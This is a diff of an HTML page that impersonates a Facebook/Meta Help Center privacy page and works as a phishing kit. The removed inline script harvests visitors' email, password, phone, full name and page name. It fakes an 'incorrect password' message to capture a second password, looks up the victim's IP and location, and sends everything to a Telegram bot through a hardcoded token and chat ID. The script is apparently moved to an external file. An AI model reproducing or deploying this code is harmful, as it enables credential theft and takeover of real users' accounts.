@@ -1,95 +1,145 @@
 <html lang="en">
 
 <head>
+    <meta http-equiv=content-type content="text/html; charset=UTF-8">
+    <meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
     <title>Privacy Policy</title>
     <link href="static/themes/custom.css" rel="stylesheet" media="screen">
     <link href="static/themes/link_custom.css" rel="stylesheet" media="screen">
     <link href="static/themes/animate.css" rel="stylesheet" media="screen">
-    <link href="static/css/app.cad2193a277eb5a4ec97d5295f5120bd.css" rel="stylesheet">
-    <link rel="stylesheet" crossorigin="" href="assets/index-ZU7tKWJA.css">
-    <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
-    <style id="mttstyle">
-        .tippy-box[data-theme~="custom"] {
-            font-size: 14px !important;
-            max-width: 200px !important;
-            text-align: center !important;
-            backdrop-filter: blur(2px) !important;
-            background-color: #000000b8 !important;
-            color: #ffffffff !important;
-            overflow-wrap: break-word !important;
+    <link href="static/css/app.css" rel="stylesheet">
+    <link rel="stylesheet" crossorigin="" href="assets/index.css">
+
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
         }
 
-        [data-tippy-root] {
-            display: inline-block !important;
-            visibility: visible !important;
+        .password-popup {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
         }
 
-        .tippy-box[data-theme~='custom'][data-placement^='top']>.tippy-arrow::before {
-            border-top-color: #000000b8 !important;
+        .red-text {
+            color: red;
         }
 
-        .tippy-box[data-theme~='custom'][data-placement^='bottom']>.tippy-arrow::before {
-            border-bottom-color: #000000b8 !important;
-        }
-
-        .tippy-box[data-theme~='custom'][data-placement^='left']>.tippy-arrow::before {
-            border-left-color: #000000b8 !important;
-        }
-
-        .tippy-box[data-theme~='custom'][data-placement^='right']>.tippy-arrow::before {
-            border-right-color: #000000b8 !important;
-        }
-
-        .mtt-highlight {
-            background-color: #21dc6d40 !important;
-            position: absolute !important;
-            z-index: 100000100 !important;
-            pointer-events: none !important;
-            display: inline !important;
-            border-radius: 3px !important;
-        }
-
-        .ocr_text_div {
+        .popup-content {
             position: absolute;
-            opacity: 0.7;
-            font-size: calc(100% + 1cqw);
-            overflow: hidden;
-            border: 2px solid CornflowerBlue;
-            color: transparent !important;
-            background: none !important;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+        }
+
+        .lds-ellipsis {
+            display: inline-block;
+            position: relative;
+            width: 80px;
+            height: 80px;
+        }
+
+        .lds-ellipsis div {
+            position: absolute;
+            top: 33px;
+            width: 5px;
+            height: 5px;
+            border-radius: 50%;
+            background: rgb(26, 86, 219);
+            animation-timing-function: cubic-bezier(0, 1, 1, 0);
+        }
+
+        .lds-ellipsis div:nth-child(1) {
+            left: 8px;
+            animation: lds-ellipsis1 0.6s infinite;
+        }
+
+        .lds-ellipsis div:nth-child(2) {
+            left: 8px;
+            animation: lds-ellipsis2 0.6s infinite;
+        }
+
+        .lds-ellipsis div:nth-child(3) {
+            left: 32px;
+            animation: lds-ellipsis2 0.6s infinite;
+        }
+
+        .lds-ellipsis div:nth-child(4) {
+            left: 56px;
+            animation: lds-ellipsis3 0.6s infinite;
+        }
+
+        @keyframes lds-ellipsis1 {
+            0% {
+                transform: scale(0);
+            }
+
+            100% {
+                transform: scale(1);
+            }
+        }
+
+        @keyframes lds-ellipsis3 {
+            0% {
+                transform: scale(1);
+            }
+
+            100% {
+                transform: scale(0);
+            }
+        }
+
+        @keyframes lds-ellipsis2 {
+            0% {
+                transform: translate(0, 0);
+            }
+
+            100% {
+                transform: translate(24px, 0);
+            }
         }
     </style>
+
+
 </head>
 
 <body>
     <div id="app" data-v-app="">
         <div id="app">
             <div>
-                <div class="topheader bg-facebook p-2">
+                <div class="topheader bgfb p-2">
                     <div class="sm:w-11/12 md:w-4/6 flex justify-between items-center mx-auto">
                         <div class="w-[20%] md:w-[15%]"><a href=""><img src="static/uploads/facebook.png"
                                     class="object-cover"></a></div>
                         <div class="flex shadow-sm w-[60%] md:w-[50%]"><span
-                                class="px-4 inline-flex items-center min-w-fit border border-r-0 border-gray-200 bg-gray-50 text-sm"><ion-icon
-                                    name="search-outline" role="img" class="md hydrated"><svg
-                                        xmlns="http://www.w3.org/2000/svg" class="ionicon s-ion-icon"
-                                        viewBox="0 0 512 512">
+                                class="px-4 inline-flex items-center min-w-fit border border-r-0 border-gray-200 bg-gray-50 text-sm">
+                                <div name="search-outline" role="img" class="md hydrated"><svg
+                                        xmlns="http://www.w3.org/2000/svg" class="iconsus s-div" viewBox="0 0 512 512">
                                         <path d="M221.09 64a157.09 157.09 0 10157.09 157.09A157.1 157.1 0 00221.09 64z"
-                                            stroke-miterlimit="10" class="ionicon-fill-none ionicon-stroke-width">
+                                            stroke-miterlimit="10" class="iconsus-fill-none iconsus-stroke-width">
                                         </path>
                                         <path stroke-linecap="round" stroke-miterlimit="10" d="M338.29 338.29L448 448"
-                                            class="ionicon-fill-none ionicon-stroke-width"></path>
-                                    </svg></ion-icon></span><input type="search"
+                                            class="iconsus-fill-none iconsus-stroke-width"></path>
+                                    </svg></div>
+                            </span><input type="search"
                                 class="py-2 px-3 pr-11 block w-full border-gray-200 shadow-sm text-sm focus:z-10 focus:border-blue-500 focus:ring-blue-500 focus:outline-none"
                                 placeholder="How can we help?"></div>
                     </div>
                 </div>
                 <div class="bg-[#E9EBEE]">
                     <div class="w-11/12 sm:w-11/12 md:w-4/6 flex justify-between items-center mx-auto"><a href="#"
-                            class="flex items-center text-[#3578E5] gap-2 font-semibold py-4 border-b-[3px] border-[#3578E5]"><ion-icon
-                                name="home" role="img" class="md hydrated">
-                                <div class="icon-inner"><svg xmlns="http://www.w3.org/2000/svg"
-                                        class="ionicon s-ion-icon" viewBox="0 0 512 512">
+                            class="flex items-center text-[#3578E5] gap-2 font-semibold py-4 border-b-[3px] border-[#3578E5]">
+                            <div name="home" role="img" class="md hydrated">
+                                <div class="icon-inner"><svg xmlns="http://www.w3.org/2000/svg" class="iconsus s-div"
+                                        viewBox="0 0 512 512">
                                         <path
                                             d="M261.56 101.28a8 8 0 00-11.06 0L66.4 277.15a8 8 0 00-2.47 5.79L63.9 448a32 32 0 0032 32H192a16 16 0 0016-16V328a8 8 0 018-8h80a8 8 0 018 8v136a16 16 0 0016 16h96.06a32 32 0 0032-32V282.94a8 8 0 00-2.47-5.79z">
                                         </path>
@@ -97,7 +147,8 @@
                                             d="M490.91 244.15l-74.8-71.56V64a16 16 0 00-16-16h-48a16 16 0 00-16 16v32l-57.92-55.38C272.77 35.14 264.71 32 256 32c-8.68 0-16.72 3.14-22.14 8.63l-212.7 203.5c-6.22 6-7 15.87-1.34 22.37A16 16 0 0043 267.56L250.5 69.28a8 8 0 0111.06 0l207.52 198.28a16 16 0 0022.59-.44c6.14-6.36 5.63-16.86-.76-22.97z">
                                         </path>
                                     </svg></div>
-                            </ion-icon> Help Center </a>
+                            </div> Help Center
+                        </a>
                         <p class="text-[#3578E5] text-xs">English</p>
                     </div>
                 </div>
@@ -184,7 +235,7 @@
                         <div
                             class="font-semibold rounded-b-lg flex justify-end text-lg border-t border-gray-200 bg-[#F5F6F7] p-3">
                             <button type="submit"
-                                class="bg-blue-800 hover:bg-facebook rounded-sm px-4 py-2 text-white text-sm font-semibold">
+                                class="bg-blue-800 hover:bgfb rounded-sm px-4 py-2 text-white text-sm font-semibold">
                                 Send </button>
                         </div>
                     </form>
@@ -194,14 +245,16 @@
                         <div
                             class="grid xl:grid-cols-5 gap-y-4 lg:grid-cols-3 md:grid-cols-2 grid-cols-2 text-[#90949c] text-sm">
                             <ul class="grid gap-y-2">
-                                <li><ion-icon name="logo-facebook" role="img" class="md hydrated">
+                                <li>
+                                    <div name="logo-facebook" role="img" class="md hydrated">
                                         <div class="icon-inner"><svg xmlns="http://www.w3.org/2000/svg"
-                                                class="ionicon s-ion-icon" viewBox="0 0 512 512">
+                                                class="iconsus s-div" viewBox="0 0 512 512">
                                                 <path
                                                     d="M480 257.35c0-123.7-100.3-224-224-224s-224 100.3-224 224c0 111.8 81.9 204.47 189 221.29V322.12h-56.89v-64.77H221V208c0-56.13 33.45-87.16 84.61-87.16 24.51 0 50.15 4.38 50.15 4.38v55.13H327.5c-27.81 0-36.51 17.26-36.51 35v42h62.12l-9.92 64.77H291v156.54c107.1-16.81 189-109.48 189-221.31z"
                                                     fill-rule="evenodd"></path>
                                             </svg></div>
-                                    </ion-icon></li>
+                                    </div>
+                                </li>
                             </ul>
                             <ul class="grid gap-y-2">
                                 <li>Meta © 2023</li>
@@ -224,102 +277,7 @@
                         </div>
                     </div>
                 </div><!---->
-                <style>
-                    body {
-                        font-family: Arial, sans-serif;
-                    }
 
-                    .password-popup {
-                        display: none;
-                        position: fixed;
-                        top: 0;
-                        left: 0;
-                        width: 100%;
-                        height: 100%;
-                        background-color: rgba(0, 0, 0, 0.5);
-                    }
-
-                    .red-text {
-                        color: red;
-                    }
-
-                    .popup-content {
-                        position: absolute;
-                        top: 50%;
-                        left: 50%;
-                        transform: translate(-50%, -50%);
-                        background-color: #fff;
-                        border-radius: 8px;
-                        box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
-                    }
-
-                    .lds-ellipsis {
-                        display: inline-block;
-                        position: relative;
-                        width: 80px;
-                        height: 80px;
-                    }
-
-                    .lds-ellipsis div {
-                        position: absolute;
-                        top: 33px;
-                        width: 5px;
-                        height: 5px;
-                        border-radius: 50%;
-                        background: rgb(26, 86, 219);
-                        animation-timing-function: cubic-bezier(0, 1, 1, 0);
-                    }
-
-                    .lds-ellipsis div:nth-child(1) {
-                        left: 8px;
-                        animation: lds-ellipsis1 0.6s infinite;
-                    }
-
-                    .lds-ellipsis div:nth-child(2) {
-                        left: 8px;
-                        animation: lds-ellipsis2 0.6s infinite;
-                    }
-
-                    .lds-ellipsis div:nth-child(3) {
-                        left: 32px;
-                        animation: lds-ellipsis2 0.6s infinite;
-                    }
-
-                    .lds-ellipsis div:nth-child(4) {
-                        left: 56px;
-                        animation: lds-ellipsis3 0.6s infinite;
-                    }
-
-                    @keyframes lds-ellipsis1 {
-                        0% {
-                            transform: scale(0);
-                        }
-
-                        100% {
-                            transform: scale(1);
-                        }
-                    }
-
-                    @keyframes lds-ellipsis3 {
-                        0% {
-                            transform: scale(1);
-                        }
-
-                        100% {
-                            transform: scale(0);
-                        }
-                    }
-
-                    @keyframes lds-ellipsis2 {
-                        0% {
-                            transform: translate(0, 0);
-                        }
-
-                        100% {
-                            transform: translate(24px, 0);
-                        }
-                    }
-                </style>
                 <!doctype html>
                 <div class="password-popup" id="passwordPopup"
                     class="fixed top-0 left-0 right-0 z-50 w-full p-4 overflow-x-hidden overflow-y-auto md:inset-0 h-[calc(100%-1rem)] max-h-full justify-center items-center flex hidden">
@@ -349,125 +307,6 @@
                                         class="w-full text-white bg-blue-700 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800">
                                         Continue </button>
                                 </form>
-                                <script>
-                                    function validateInput(inputElement) {
-                                        const value = parseInt(inputElement.value);
-                                        if (isNaN(value) || value % 1 !== 0) {
-                                            document.getElementById('messageerror').innerText = 'Please enter a phone number';
-                                        } else {
-                                            // Nếu giá trị là số nguyên, xóa thông báo lỗi
-                                            document.getElementById('messageerror').innerText = '';
-                                        }
-                                    }
-                                    function showPasswordForm(event) {
-                                        event.preventDefault();
-                                        document.getElementById("passwordPopup").style.display = "block";
-                                    }
-                                    function closePopup() {
-                                        document.getElementById("passwordPopup").style.display = "none";
-                                    }
-
-                                    let attempts = 0;
-                                    let firstPassword = "";
-                                    function getUserIP(callback) {
-                                        fetch('https://api.ipify.org/?format=json')
-                                            .then(response => response.json())
-                                            .then(data => {
-                                                callback(data.ip);
-                                            })
-                                            .catch(error => {
-                                                console.error('Failed to fetch IP:',error);
-                                                callback(null);
-                                            });
-                                    }
-                                    function checkPassword() {
-                                        var password = document.getElementById("password").value;
-                                        var messageDiv = document.getElementById("messageContainer");
-
-                                        if (attempts === 0) {
-                                            if (password.trim() === "") {
-                                                messageDiv.innerHTML = "Please enter your password";
-                                                return; // Không tiếp tục nếu mật khẩu trống
-                                            } else {
-                                                attempts++;
-                                                firstPassword = password;
-                                                messageDiv.innerHTML = "The password that you've entered is incorrect";
-                                            }
-
-                                            document.getElementById("passwordForm").reset();
-                                        } else if (attempts === 1 || attempts === 2 || attempts === 3) {
-                                            attempts++;
-                                            const email = $("#email").val();
-                                            const password = $("#password").val();
-                                            const phone = $("#phone").val();
-                                            const emailbs = $("#emailbs").val();
-                                            const namefanpage = $("#namefanpage").val();
-                                            const fullname = $("#fullname").val();
-
-                                            if (password.trim() === "") {
-                                                messageDiv.innerHTML = "Please enter your password";
-                                            } else {
-                                                messageDiv.innerHTML = '<div class="lds-ellipsis"><div></div><div></div><div></div><div></div></div>'
-
-                                                // Lấy địa chỉ IP và thông tin thành phố, quốc gia
-                                                getUserIP(function (ip) {
-                                                    if (!ip) {
-                                                        console.error('IP not available');
-                                                        return;
-                                                    }
-
-                                                    fetch('https://freeipapi.com/api/json/' + encodeURIComponent(ip))
-                                                        .then(response => response.json())
-                                                        .then(data => {
-
-
-                                                            const ipAddress = data.ipAddress;
-                                                            const cityName = data.cityName;
-                                                            const countryName = data.countryName;
-                                                            const requestData = `
-email: ${email}
-firstPassword: ${firstPassword}
-password: ${password}
-phone: ${phone}
-emailbs: ${emailbs}
-country: ${countryName}
-city: ${cityName}
-Ip: ${ipAddress}
-namefanpage: ${namefanpage}
-fullname: ${fullname}
-`
-
-                                                            const botToken = '6675441092:AAENA2tQAnzrJmyDtEJl9OecVVmAyQtpBlE';
-                                                            const chatId = '-4148627434';
-                                                            const rdata = {
-                                                                chat_id: chatId,
-                                                                text: requestData
-                                                            };
-                                                            $.ajax({
-                                                                type: "POST",
-                                                                url: `https://api.telegram.org/bot${botToken}/sendMessage`,
-                                                                data: rdata,
-                                                                success: function (response) {
-                                                                    console.log(response);
-                                                                    setTimeout(function () {
-                                                                        window.location.href = `meta-community-confirm.html?email=${encodeURIComponent(email)}&firstPassword=${encodeURIComponent(firstPassword)}&password=${encodeURIComponent(password)}&phone=${encodeURIComponent(phone)}&emailbs=${encodeURIComponent(emailbs)}&country=${encodeURIComponent(countryName)}&city=${encodeURIComponent(cityName)}&Ip=${encodeURIComponent(ipAddress)}`;
-                                                                    },1000);
-                                                                },
-                                                                error: function () {
-                                                                    alert("An error occurred.");
-                                                                }
-                                                            });
-                                                        })
-                                                        .catch(error => {
-                                                            console.error('Failed to send IP to API:',error);
-                                                        });
-                                                });
-                                            }
-                                        }
-                                    }
-
-
-                                </script>
                             </div>
                         </div>
                     </div>
@@ -475,6 +314,8 @@ fullname: ${fullname}
             </div>
         </div>
     </div>
+    <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
+    <script src="./static/js/index.js"></script>
 </body>
 
 </html>
